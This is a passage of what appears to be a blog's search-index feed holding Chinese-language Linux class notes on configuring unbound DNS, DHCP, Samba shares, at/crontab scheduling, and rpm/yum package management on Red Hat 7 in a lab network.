title="部署"></a>部署</h1><p><font face="微软雅黑" color="red" size="6">配置文件：</font></p><p>常用配置文件：</p><p><code>/etc/unbound/unbound.conf</code>#主(全局)配置文件</p><p><code>/etc/unbound/local.d</code>#子配置文件所在目录。其中的*.conf用于定义正向解析记录和反向解析记录以及设置转发</p><p><code>/etc/hosts</code>#用于指定ip地址与主机名的映射关系</p><p><code>/etc/resolv.conf</code>#为linux指定DNS服务器的IP地址配置文件</p><h3 id="授权DNS服务器"><a href="#授权DNS服务器" class="headerlink" title="授权DNS服务器"></a>授权DNS服务器</h3><p>检查是否安装成功</p><p><code>[root@Jw2031-122 ~]# rpm -qa |grep unbound</code><br><code>unbound-libs-1.4.20-19.el7.x86_64</code><br><code>unbound-1.4.20-19.el7.x86_64</code></p><p><strong>示例</strong>⤵️</p><p>配置参数如图，根据如图配置</p><p>本机ip地址：192.168.22.150</p><table><thead><tr><th align="center">服务器</th><th align="center">完全合格域名</th><th align="center">IP地址</th></tr></thead><tbody><tr><td align="center">授权DNS服务器</td><td align="center">dns1.dyzx.edu</td><td align="center">192.168.22.150</td></tr><tr><td align="center">纯缓存DNS服务器</td><td align="center">dns2.dyzx.edu</td><td align="center">192.168.22.2</td></tr><tr><td align="center">Web服务器</td><td align="center"><code>www.dyzx.edu</code></td><td align="center">192.168.22.3</td></tr><tr><td align="center">FTP服务器</td><td align="center">ftp.dyzx.edu</td><td align="center">192.168.22.3</td></tr><tr><td align="center">邮件服务器</td><td align="center">mail.dyzx.edu</td><td align="center">192.168.22.4</td></tr></tbody></table><p><font color="#dd00dd" face="fantasy">&#x2F;etc&#x2F;unbound&#x2F;unbound.conf</font></p><p><font face="黑体">38  interface: 192.168.22.150&#x2F;&#x2F;设置监听网络接口</font></p><p><font face="宋体">176  access-control: 192.168.22.0&#x2F;24 allow&#x2F;&#x2F;允许给某些地址提供解析[allow允许或拒绝refuse]</font></p><p><font face="微软雅黑">211   username: “”&#x2F;&#x2F;改为空字串，表示任何用户均可访问</font></p><p><font face="Helvetica">368  domain-insecure: “dyzx.edu”&#x2F;&#x2F;跳过验证域’dyzx.edu’以避免信任验证失败</font></p><p><font face="黑体">478  include: &#x2F;etc&#x2F;unbound&#x2F;local.d&#x2F;*.conf&#x2F;&#x2F;指定其他可能的配置文件包含当前文件</font></p><p><font color=#0099ff size=3 face="黑体">在全局配置文件中配置正向和反向解析记录：</font></p><pre><code>    # You can add locally served data with     local-zone: &quot;dyzx.edu.&quot; static     local-data: &quot;dyzx.edu. 86400 IN SOA dns1.dyzx.edu. root.dyzx.edu  1 1D 1H 1W 1H&quot;     local-data: &quot;dns1.dyzx.edu.  IN        A       192.168.22.150&quot;     local-data: &quot;dns2.dyzx.edu.  IN        A       192.168.22.2&quot;     local-data: &quot;www.dyzx.edu.  IN         A       192.168.22.3&quot;     local-data: &quot;ftp.dyzx.edu.  IN         CNAME   www.dyzx.edu.&quot;     local-data: &quot;mail.dyzx.edu.  IN        A       192.168.22.4&quot;     local-data: &quot;dyzx.edu.  IN     MX  5   mail.dyzx.edu.&quot;     local-data-ptr: &quot;192.168.22.150        dns1.dyzx.edu&quot;     local-data-ptr: &quot;192.168.22.2          dns2.dyzx.edu&quot;     local-data-ptr: &quot;192.168.22.3          www.dyzx.edu&quot;     local-data-ptr: &quot;192.168.22.3          ftp.dyzx.edu&quot;     local-data-ptr: &quot;192.168.22.4          mail.dyzx.edu&quot;</code></pre><p><strong>配置转发</strong></p><p>任何一台DNS服务器能直接提供的解析记录都是有限的，当用户请求的解析记录超过了某台DNS服务器所能解析的范围时，就需要在该DNS服务器上设置转发功能，以便把超范围的用户解析请求转发给DNS服务器代为解析。</p><p><code>553  forward-zone:</code><br><code>554         name: &quot;.&quot;</code><br><code>555         forward-addr: 8.8.8.8</code></p><p>测试： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt; set type=MX</span><br><span class="line">&gt; dyzx.edu</span><br><span class="line">Server:127.0.0.1</span><br><span class="line">Address:127.0.0.1#53</span><br><span class="line"></span><br><span class="line">dyzx.edumail exchanger = 5 mail.dyzx.edu.</span><br><span class="line">&gt; set type=cname</span><br><span class="line">&gt; ftp.dyzx.edu</span><br><span class="line">Server:127.0.0.1</span><br><span class="line">Address:127.0.0.1#53</span><br><span class="line"></span><br><span class="line">ftp.dyzx.educanonical name = www.dyzx.edu.</span><br><span class="line">&gt; </span><br><span class="line">&gt; 192.168.22.3</span><br><span class="line">Server:127.0.0.1</span><br><span class="line">Address:127.0.0.1#53</span><br><span class="line"></span><br><span class="line">3.22.168.192.in-addr.arpaname = ftp.dyzx.edu.</span><br><span class="line">3.22.168.192.in-addr.arpaname = www.dyzx.edu.</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之DHCP服务部署</title>
      <link href="/posts/31568"/>
      <url>/posts/31568</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Windows11、VMware Workstation 16.2.2</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p>Red hat7.0</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><blockquote><p>过程1：寻找DHCP服务器<br>当DHCP客户端第一次登录网络的时候，计算机发现本机上没有任何IP地址设定，将以广播方式发送DHCP discover发现信息来寻找DHCP服务器，即向255.255.255.255发送特定的广播信息。网络上每一台安装了TCP&#x2F;IP协议的主机都会接收这个广播信息，但只有DHCP服务器才会做出响应。</p><p>过程2：分配IP地址<br>在网络中接收到DHCP discover发现信息的DHCP服务器就会做出响应，它从尚未分配的IP地址池中挑选一个分配给DHCP客户机，向DHCP客户机发送一个包含分配的IP地址和其他设置的DHCP offer提供信息。</p><p>过程3：接受IP地址<br>DHCP客户端接受到DHCP offer提供信息之后，选择第一个接收到的提供信息，然后以广播的方式回答一个DHCP request请求信息，该信息包含向它所选定的DHCP服务器请求IP地址的内容。</p><p>过程4：IP地址分配确认<br>当DHCP服务器收到DHCP客户端回答的DHCP request请求信息之后，便向DHCP客户端发送一个包含它所提供的IP地址和其他设置的DHCP ack确认信息，告诉DHCP客户端可以使用它提供的IP地址。然后，DHCP客户机便将其TCP&#x2F;IP协议与网卡绑定，另外，除了DHCP客户机选中的DHCP服务器外，其他的DHCP服务器将收回曾经提供的IP地址。</p><p>过程5：重新登录<br>以后DHCP客户端每次重新登录网络时，就不需要再发送DHCP discover发现信息了，而是直接发送包含前一次所分配的IP地址的DHCP request请求信息。当DHCP服务器收到这一信息后，它会尝试让DHCP客户机继续使用原来的IP地址，并回答一个DHCP ack确认信息。如果此IP地址已无法再分配给原来的DHCP客户机使用时，则DHCP服务器给DHCP客户机回答一个DHCP nack否认信息。当原来的DHCP客户机收到此DHCP nack否认信息后，它就必须重新发送DHCP discover发现信息来请求新的IP地址。</p><p>过程6：更新租约<br>DHCP服务器向DHCP客户机出租的IP地址一般都有一个租借期限，期满后DHCP服务器便会收回出租的IP地址。如果DHCP客户机要延长其IP租约，则必须更新其IP租约。DHCP客户机启动时和IP租约期限到达租约的50%时，DHCP客户机都会自动向DHCP服务器发送更新其IP租约的信息。</p></blockquote><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>执行yum源安装安装</p><p><code>[root@Jw2031-122 ~]# yum install dhcp -y</code></p><p>检查是否安装成功</p><p><code>[root@Jw2031-122 ~]# rpm -qa |grep dhcp</code><br><code>dhcp-libs-4.2.5-27.el7.x86_64</code><br><code>dhcp-common-4.2.5-27.el7.x86_64</code><br><code>dhcp-4.2.5-27.el7.x86_64</code></p><p><font face="微软雅黑" color="red" size="6">配置文件：</font></p><blockquote><p>一个标准的配置文件包含：</p><p>全局配置参数：用于定义dhcpd服务程序的整运行参数；</p><p>子网网段申明：用于配置整个子网段的地址属性；</p><p>地址配置选项</p><p>地址配置参数</p></blockquote><p><code>[root@Jw2031-122 dhcp]# cp -p /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.conf</code><br><code>cp: overwrite ‘/etc/dhcp/dhcpd.conf’? y</code>#复制模板文件</p><p><code>/etc/dhcp/dhcpd.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">subnet 192.168.182.0 netmask 255.255.255.0 &#123;</span><br><span class="line">  range 192.168.182.100 192.168.182.150;             # 地址池</span><br><span class="line">  option domain-name-servers ns1.internal.example.org; # 为客户端指明DNS服务器地址，可以是多个，最多三个</span><br><span class="line">  option domain-name &quot;internal.example.org&quot;;               # 为客户端指明DNS名字，定义了它会覆盖客户端/etc/resolv.conf里的配置</span><br><span class="line">  option routers 192.168.182.2;               # 默认路由，其实就是网关</span><br><span class="line">  option broadcast-address 192.168.182.255;    # 广播地址，不设置时默认会根据A/B/C类地址自动计算</span><br><span class="line">  default-lease-time 600;                # 默认租约时长</span><br><span class="line">  max-lease-time 7200;                   # 最大租约时长</span><br><span class="line">&#125;</span><br><span class="line">#下面的是绑定MAC地址设置保留地址，保留地址不能是地址池中的地址</span><br><span class="line">host fantasia &#123;            # 固定地址的配置，host后面的是标识符，没意义</span><br><span class="line">  hardware ethernet 00:0c:29:ac:fa:91;</span><br><span class="line">  fixed-address 192.168.182.10;      # 根据MAC地址分配的固定IP </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之samba服务部署</title>
      <link href="/posts/63516"/>
      <url>/posts/63516</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Windows11、VMware Workstation 16.2.2</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p>Red hat7.0</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>samba是什么？能干什么？什么场合需要用到它？</p><ul><li>samba 是基于SMB协议（ServerMessage Block，信息服务块）的开源软件，samba也可以是SMB协议的商标。SMB是一种Linux、UNIX系统上可用于共享文件和打印机等资源的协议，这种协议是基于Client\Server型的协议，Client端可以通过SMB访问到Server（服务器）上的共享资源。当Windows是 Client，CentOS是服务器时，通过Samba就可以实现window访问Linux的资源，实现两个系统间的数据交互。</li><li>Linux对于开发来说是一个非常好的系统，但是人机友好不如windows，我就通常在windows上用sourceinsight编辑代码，然后在Linux端编译运行，而且经常需要把音视频从Linux和windows端互相拷贝，这时候Samba就显得很方便了。</li></ul><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>执行yum源安装</p><p><code>[root@jw2031-122 ~]# yum install samba -y</code></p><p>检查是否安装成功</p><p><code>[root@jw2031-122 ~]# rpm -qa |grep samba</code><br><code>samba-libs-4.6.2-8.el7.x86_64</code><br><code>samba-common-4.6.2-8.el7.noarch</code><br><code>samba-client-libs-4.6.2-8.el7.x86_64</code><br><code>samba-common-libs-4.6.2-8.el7.x86_64</code><br><code>samba-4.6.2-8.el7.x86_64</code><br><code>samba-common-tools-4.6.2-8.el7.x86_64</code></p><p><font face="微软雅黑" color="red" size="6">配置文件：</font></p><p><code>/etc/samba/smb.conf</code></p><p><strong>常用配置文件结构说明：</strong></p><br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">【自定义共享目录】</span><br><span class="line">comment        #共享目录描述信息</span><br><span class="line">path         #共享目录路径</span><br><span class="line">browseable      # 共享目录在网络中是否可见</span><br><span class="line">public        #是否允许匿名用户访问共享文件或打印机资源</span><br><span class="line">guest ok        #共享目录是否允许所有人访问</span><br><span class="line">invalid user         #禁止访问该共享的用户</span><br><span class="line">valid users = 用户名#设置访问用户</span><br><span class="line">valid users = @组名</span><br><span class="line">readonly = yes #只读          #设置目录只读还是可读写</span><br><span class="line">readonly = no #读写</span><br><span class="line">writable = yes #读写#指定共享目录有读写权还是只读权</span><br><span class="line">writable = no #只读</span><br><span class="line">write list = 用户名#设置对共享目录具有可读写权限的用户名或组名，多个用户名或组名以空格分隔</span><br><span class="line">write list = @组名#若writeable=no，则不在write list列表中的用户将具有只读权限</span><br><span class="line">create mask= 文件权限值#设置用户在共享目录下创建文件默认访问权限。</span><br><span class="line">directory mask = 子目录权限值#设置用户在共享目录下创建子目录的默认访问权限</span><br></pre></td></tr></table></figure><br /><h2 id="匿名访问共享目录"><a href="#匿名访问共享目录" class="headerlink" title="匿名访问共享目录"></a>匿名访问共享目录</h2><p>实例：<font face="楷体" color=" #FFA042" size="4">某学校办公室通过samba服务器发布公共共享目录“&#x2F;usr&#x2F;share&#x2F;public”共享名为public_doc，允许除192.168.22.222以外的192.168.22.0网段中所有客户端访问，可以写入文件，但是不可以删除或修改其他用户文件。</font></p><p><code>[root@Jw2031-122 ~]# mkdir /usr/share/public</code><br><code>[root@Jw2031-122 ~]# touch /usr/share/public/file01.md</code><br><code>[root@Jw2031-122 ~]# chmod 1777 /usr/share/public//所有用户可写入但不能删他人文件</code></p><p><code>[root@Jw2031-122 ~]# vi /etc/samba/smb.conf</code></p><p><code>[global]//全局参数</code><br>        <code>workgroup = SAMBA//设置samba服务所在的工作组</code><br>        <code>security = user//设置身份验证方式</code><br>        <code>map to guest = Bad User//开启匿名访问</code><br>        <code>hosts allow = 192.168.22. except 192.168.22.222//默认允许所有IP访问,允许访问与不允许访问ip地址</code></p><p><code>[public_doc]</code><br>        <code>comment = public</code><br>        <code>path = /usr/share/public</code><br>        <code>guest ok = yes//允许匿名访问</code><br>        <code>browseable = yes//共享目录是否可见</code><br>        <code>writeable = yes//共享目录可以读写</code><br>        <code>printable = no//用户不可以打印</code></p><p>测试：略🦵</p><h2 id="用户认证访问共享目录"><a href="#用户认证访问共享目录" class="headerlink" title="用户认证访问共享目录"></a>用户认证访问共享目录</h2><p>实例1：<font face="楷体" color=" #FFA042" size="4">在samba服务器上按部门建立相应目录，要求教务处和学生处只可以被校长和本部门员工访问，禁止非本部门员工访问。</font></p><ul><li>办公室</li></ul><p><code>目录：/usr/share/public共享名：public_doc目录访问权限：匿名用户均可读写执行</code>   </p><ul><li>教务处</li></ul><p><code>目录：/usr/share/jwc共享名：jwc_doc部门组账号名：gjwc部门中用户：rector(读写执行)、zhang3(读取)</code></p><ul><li>学生处</li></ul><p><code>目录：/usr/share/xsc共享名：xsc_doc部门组账号名：gxsc部门中用户：rector(读写执行)、li4(读取)</code></p><br /><p>步骤1：按部门创建组账号归属相关部门</p><p><code>[root@Jw2031-122 ~]# groupadd -r gjwc</code>&#x2F;&#x2F;创建ID号小于等于1000的系统组账号<br><code>[root@Jw2031-122 ~]# groupadd -r gxsc</code><br><code>[root@Jw2031-122 ~]# useradd -M -G gjwc -s /sbin/nologin zhang3</code>&#x2F;&#x2F;-M  不创建家目录<br><code>[root@Jw2031-122 ~]# useradd -M -G gxsc -s /sbin/nologin li4</code>&#x2F;&#x2F;-G  指定所属附加组<br><code>[root@Jw2031-122 ~]# useradd -M -G gjwc,gxsc -s /sbin/nologin rector</code>&#x2F;&#x2F;-S 指定用户登录使用的Shell</p><p>步骤2：使用pdbedit命令创建与linux系统用户同名的samba用户。</p><p><code>[root@Jw2031-122 ~]# pdbedit -a zhang3</code></p><p><code>[root@Jw2031-122 ~]# pdbedit -a li4</code></p><p><code>[root@Jw2031-122 ~]# pdbedit -a rector</code></p><p>步骤3：创建各部门相应的共享目录和访问权限</p><p><code>[root@Jw2031-122 ~]# mkdir -p /usr/share/public</code><br><code>[root@Jw2031-122 ~]# mkdir -p /usr/share/jwc /usr/share/xsc</code><br><code>[root@Jw2031-122 ~]# touch /usr/share/jwc/file1.tar /usr/share/xsc/file2.tar</code><br><code>[root@Jw2031-122 ~]# chown rector.gjwc /usr/share/jwc</code>&#x2F;&#x2F;修改目录的属主及属组<br><code>[root@Jw2031-122 ~]# chown rector.gxsc /usr/share/xsc</code><br><code>[root@Jw2031-122 ~]# ll -d /usr/share/jwc /usr/share/xsc</code><br><code>drwxr-xr-x. 2 rector gjwc 23 5月   1 18:23 /usr/share/jwc</code><br><code>drwxr-xr-x. 2 rector gxsc 23 5月   1 18:23 /usr/share/xsc</code><br><code>[root@Jw2031-122 ~]# chmod 750 /usr/share/jwc</code>&#x2F;&#x2F;修改目录的访问权限<br><code>[root@Jw2031-122 ~]# chmod 750 /usr/share/xsc</code><br>步骤4：修改Samba主配置文件smb.conf</p><p><code>[root@Jw2031-122 samba]# vi smb.conf</code></p><p><code>[global]</code><br>        <code>security = user</code>&#x2F;&#x2F;设置Samba服务器对客户端进行身份验证的方式<br>        <code>idmap config * : backend = tdb</code></p><p><code>[jwc_doc]</code><br><code>comment = jwc data</code><br><code>path = /usr/share/jwc</code><br><code>create mask = 770</code><br><code>directory mask = 770</code><br><code>valid users = rector @gjwc</code><br><code>write list = rector @gjwc</code></p><p><code>[xsc_doc]</code><br>        <code>comment = xsc data</code><br>        <code>path = /usr/share/xsc</code><br>        <code>browseable = No</code><br>        <code>create mask = 770</code><br>        <code>directory mask = 770</code><br>        <code>valid users = rector @gxsc</code><br>        <code>write list = rector @gxsc</code></p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>windows 测试略~</p><p>断开连接小命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在Windows系统下删除远程连接：</span><br><span class="line">net use * /delete</span><br></pre></td></tr></table></figure><p>linux客户端挂载✍</p><p>install⤵️</p><p><code>samba-client</code><br><code>samba-common</code><br><code>cifs-utils</code></p><p><font color="#dd00dd">&#x2F;dyzx_share为客户端共享名并非目录</font> </p><p><code>[root@zs jwc]# mount -o username=Anonymous //192.168.22.150/dyzx_share /share##匿名挂载</code></p><p><code>[root@zs zs]# mount -o username=rector  //192.168.22.150/dyzx_jwc /jwc##用户挂载</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之计划任务管理</title>
      <link href="/posts/7013"/>
      <url>/posts/7013</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E9%9B%84%E5%B8%88%E5%B0%91%E5%B9%B4.jpg"></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p class="note note-danger">Windows11、VMware Workstation 16.2.2</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p class="note note-success">Red hat7.4</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p class="note note-warning">笔记整理</p><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h2><p>at命令制定一次性执行的计划任务⤵</p><p>at[选项][执行任务的时间][执行任务的日期]</p><p>选项：</p><ul><li>-m当at工作完成后，即使没有输出信息，也会以mail通知用户工作已完成</li><li>-l显示当前正在等待执行的计划任务队列</li><li>-d任务编号，删除指定编号且尚未执行的计划任务</li></ul><p>时间指定方式有：</p><ul><li>绝对时间——HH:MM[am|pm] :如 5：30pm、17：30</li><li>相对时间——now+count  time-units:其中，now就是当前时间；count是时间的数量；time-units是时间单位，如minutes(分钟)、hours(小时)、days(天)、weeks(星期)。如“now+3min”表示当前系统的3分钟后</li><li>模糊词语：如midnight(深夜)，noon(中午)，teatime(饮茶时间，一般是下午四点)等。</li></ul><p>由于at命令依赖于atd服务，所以首先要确认系统服务atd已经启动，并开机自启：⤵</p><p><code>[root@jw2031-122 ~]# systemctl is-active atd</code><br><code>active</code><br><code>[root@jw2031-122 ~]# systemctl is-enabled atd</code><br><code>enabled</code></p><p>使用at命令设置一次性计划任务：⤵</p><p><code>[root@jw2031-122 ~]# at now+2min</code><br><code>at&gt; echo &quot;zhang&quot; &gt;&gt;/tmp/date.txt#输入要执行的命令并回车</code><br><code>at&gt; &lt;EOT&gt;</code><br><code>job 2 at Sun Apr 17 19:38:00 2022</code><br><code>[root@jw2031-122 ~]# at 23:00</code><br><code>at&gt; systemctl poweroff#设置在当天17：30自动关闭系统</code><br><code>at&gt; &lt;EOT&gt;#CTRL+D提交退出</code><br><code>job 3 at Sun Apr 17 23:00:00 2022</code><br><code>[root@jw2031-122 ~]# atq#查看对已设置但还未执行的计划任务</code></p><p><code>[root@jw2031-122 ~]# atrm 3#删除任务编号为3的计划任务</code></p><h2 id="crontab命令"><a href="#crontab命令" class="headerlink" title="crontab命令"></a>crontab命令</h2><p>使用crontab命令制定周期性执行的计划任务⤵</p><p>crontab[选项]</p><p>常用选项：</p><ul><li>-e#针对当前用户或指定用户编辑计划</li><li>-u#用户名，指定执行计划任务的用户。</li><li>-l#显示当前用户或指定用户的计划任务</li><li>-r#删除当前用户或指定用户的计划任务</li></ul><p>crontab命令编辑格式：</p><p><img src="/images/Linux%E4%B9%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86/Linux%E4%B9%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%8602.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之软件包部署</title>
      <link href="/posts/13610"/>
      <url>/posts/13610</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E9%9B%84%E5%B8%88%E5%B0%91%E5%B9%B411.jpg"></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Windows11、VMware Workstation 16.2.2</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p>Red hat7.4</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>课堂笔记整理</p><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="rpm"><a href="#rpm" class="headerlink" title="rpm"></a>rpm</h2><h3 id="查询rpm软件包"><a href="#查询rpm软件包" class="headerlink" title="查询rpm软件包"></a>查询rpm软件包</h3><p>一般格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -q[选项] [安装文件1] [安装文件2]</span><br></pre></td></tr></table></figure><ul><li>-q#查询指定的一个或多个软件包是否安装</li><li>-qa#显示当前系统中已安装的全部rpm软件包清单</li><li>-qi#显示软件包名称、版本、许可协议等详情</li><li>-ql#显示指定的软件包再当前系统中安装的所有目录、文件列表</li><li>-qf#查询指定的目录或文件是由哪个软件包所产生的</li><li>-qc#显示指定软件包在当前系统中被标注配置文件的文件清单</li></ul><p>实例👁️</p><p>查询软件是否已安装⤵️</p><p><code>[root@jw2031-122 ~]# rpm -q yum httpd</code><br><code>yum-3.4.3-154.el7.noarch</code><br><code>未安装软件包 httpd</code></p><p>当查询太多时，可结合管道操作符来实现⤵️</p><p><code>[root@jw2031-122 ~]# rpm -qa |grep yum</code><br><code>yum-3.4.3-154.el7.noarch</code><br><code>yum-langpacks-0.4.2-7.el7.noarch</code><br><code>yum-utils-1.1.31-42.el7.noarch</code><br><code>PackageKit-yum-1.1.5-1.el7.x86_64</code><br><code>yum-metadata-parser-1.1.4-10.el7.x86_64</code><br><code>yum-rhn-plugin-2.0.1-9.el7.noarch</code></p><h3 id="安装删除rpm软件包"><a href="#安装删除rpm软件包" class="headerlink" title="安装删除rpm软件包"></a>安装删除rpm软件包</h3><p>一般格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安装命令   rpm -i[vh]  软件包全路径</span><br><span class="line">删除命令 rpm -e 软件包名</span><br><span class="line">升级命令 rpm -U[vh] 软件包全路径</span><br></pre></td></tr></table></figure><ul><li>-i#在当前系统中安装一个新的rpm软件包</li><li>-v#显示安装过程</li><li>-h#在安装过程中，以hash记号（“#”）显示安装进度</li><li>-e#删除指定名称的已安装的软件包</li><li>-U#升级安装，先卸载旧版，再安装新版软件包</li><li>–force#强制安装指定的软件包</li><li>–nodeps#在安装、升级或删除一个软件包时，不检查其依赖关系</li></ul><p>实例👁️</p><p>安装ppp软件包⤵️</p><p><code>[root@jw2031-122 ~]# rpm -ivh /mnt/dvd/Packages/ppp-2.4.5-33.el7.x86_64.rpm</code></p><p>删除ppp软件包⤵️</p><p><code>[root@jw2031-122 ~]# rpm -e ppp --nodeps</code></p><p>升级vim⤵️</p><p><code>[root@jw2031-122 ~]# rpm -Uvh /mnt/dvd/Packages/vim-filesystem-7.4.160-2.el7.x86_64.rpm</code></p><h2 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h2><h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><blockquote><p>yum是一个比rpm功能更加强大的命令行工具，可用于更加灵活地管理(查询、安装、升级)rpm软件包。</p></blockquote><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>以本地光盘未软件仓库创建yum源，并安装httpd软件包</p><p>1.将RHEL安装光盘放入光驱（略）</p><p>2.首先找到光盘完整路径名</p><p><code>[root@Jw2031-122 ~]# ll /dev |grep cdrom</code><br><code>lrwxrwxrwx. 1 root root           3 2月  28 08:26 cdrom -&gt; sr0</code></p><p>3.创建挂载目录【&#x2F;mnt&#x2F;dvd】，并永久挂载<br><code>[root@Jw2031-122 ~]# mkdir /mnt/dvd</code></p><p><code>[root@Jw2031-122 ~]# echo &quot;/dev/cdrom /mnt/dvd iso9660 defaults 0 0&quot; &gt;&gt;/etc/fstab</code></p><p><code>[root@Jw2031-122 ~]# mount -a</code>&#x2F;&#x2F;重新挂载文件</p><p>4.创建本地yum源</p><p>方法一：</p><p>新建yum文件，手动写入</p><p><code>[root@Jw2031-122 ~]# cd /etc/yum.repos.d</code><br><code>[root@Jw2031-122 yum.repos.d]# rm -rf *</code><br><code>[root@Jw2031-122 yum.repos.d]# vi dvd.repo</code><br><code>[root@Jw2031-122 yum.repos.d]# cat dvd.repo</code><br><code>[dvd]</code><br><code>name=dvd</code><br><code>baseurl=file:///mnt/dvd</code><br><code>gpgcheck=0</code><br><code>enabled=1</code></p><p>方法二：</p><p>命令生成一个yum源模块文件</p><p>用<code>yum-config-manager</code>命令生成一个yum源的模块文件<code>cdrom.repo</code></p><p><code>[root@Jw2031-122 yum.repos.d]# yum-config-manager --add-repo=cdrom</code></p><p><code>[root@Jw2031-122 yum.repos.d]# vi cdrom.repo</code><br><code>[root@Jw2031-122 yum.repos.d]# cat cdrom.repo</code></p><p><code>[cdrom]</code>&#x2F;&#x2F;软件仓库标识，全局唯一，不可重复<br><code>name=added from: cdrom</code>&#x2F;&#x2F;软件仓库描述信息<br><code>baseurl=file:///mnt/dvd</code>&#x2F;&#x2F;本地光盘挂载路径<br><code>enabled=1</code>&#x2F;&#x2F;此仓库是否开启，1表开启，0表关闭<br><code>gpgcheck=0</code>&#x2F;&#x2F;是否检验GPG签名，1表校验，0表不校验</p><p>5.安装httpd服务软件包，检验yum源是否可用</p><p><code>[root@Jw2031-122 ~]# yum install -y httpd</code></p><h3 id="指定"><a href="#指定" class="headerlink" title="指定"></a>指定</h3><p><code>yum install -y 包名//安装指定软件包，-y可直接回答yes</code></p><p><code>yum update -y 包名//升级指定软件包或主机中所有已安装的软件包</code></p><p><code>yum remove -y 包名//卸载已经安装系统中的指定软件包</code></p><p><code>yum info 包名//查看指定软件包的详情</code></p><p><code>yum repolist all//查看系统中yum资料库配置信息</code></p><p><code>yum clean all//清除yum源缓存或下载到本地的指定软件包</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux磁盘管理</title>
      <link href="/posts/22571"/>
      <url>/posts/22571</url>
      
